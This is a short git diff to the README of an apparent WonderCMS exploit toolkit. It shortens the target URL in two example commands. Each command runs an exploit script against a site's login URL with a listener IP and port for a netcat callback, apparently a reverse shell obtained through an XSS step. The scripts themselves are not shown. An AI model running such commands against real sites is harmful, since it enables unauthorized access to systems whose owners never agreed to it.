@@ -61,7 +61,7 @@ This version of the exploit automatically checks for an active `nc` listener, do
    ```
    Example:
    ```bash
-   ./script1.sh http://localhost/wondercms/loginURL 192.168.29.165 5252
+   ./script1.sh http://localhost/loginURL 192.168.29.165 5252
    ```
 
 ### Workflow
@@ -97,7 +97,7 @@ This version requires the user to manually manage the `nc` listener and the XSS 
    ```
    Example:
    ```bash
-   ./script2.sh http://localhost/wondercms/loginURL 192.168.29.165 5252
+   ./script2.sh http://localhost/loginURL 192.168.29.165 5252
    ```
 
 ### Workflow
